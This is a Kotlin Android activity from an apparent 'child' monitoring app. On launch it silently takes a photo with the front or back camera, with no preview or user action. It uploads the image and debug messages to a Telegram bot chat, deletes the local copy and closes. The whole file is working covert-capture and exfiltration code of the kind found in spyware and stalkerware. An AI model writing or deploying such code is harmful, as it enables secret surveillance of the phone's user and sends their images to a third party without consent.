package com.coc338781.childapp

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class CameraActivity : AppCompatActivity() {

    companion object {
        const val EXTRA_BACK = "back"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        sendDebug("🟢 CameraActivity OPENED")
        val isBack = intent.getBooleanExtra(EXTRA_BACK, true)
        takePhotoAndFinish(isBack)
    }

    private fun sendDebug(msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
                val json = """{"chat_id":"${MonitoringService.CHAT_ID}","text":"$msg"}"""
                val body = json.toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    private fun takePhotoAndFinish(isBack: Boolean) {
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                sendDebug("🟡 CameraProvider OK")
                val provider = future.get()
                val selector = CameraSelector.Builder()
                    .requireLensFacing(
                        if (isBack) CameraSelector.LENS_FACING_BACK
                        else CameraSelector.LENS_FACING_FRONT
                    ).build()
                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()
                provider.unbindAll()
                provider.bindToLifecycle(this, selector, imageCapture)
                sendDebug("🟡 Camera bound")

                val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                val options = ImageCapture.OutputFileOptions.Builder(file).build()
                imageCapture.takePicture(
                    options,
                    ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(result: ImageCapture.OutputFileResults) {
                            sendDebug("🟢 Photo saved, sending...")
                            sendAndFinish(file)
                        }
                        override fun onError(exception: ImageCaptureException) {
                            sendDebug("🔴 Camera error: ${exception.message}")
                            finish()
                        }
                    }
                )
            } catch (e: Exception) {
                sendDebug("🔴 Camera exception: ${e.message}")
                finish()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun sendAndFinish(file: File) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .build()
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
                sendDebug("🟢 Photo sent!")
            } catch (e: Exception) {
                sendDebug("🔴 Send error: ${e.message}")
            }
            runOnUiThread { finish() }
        }
    }
}
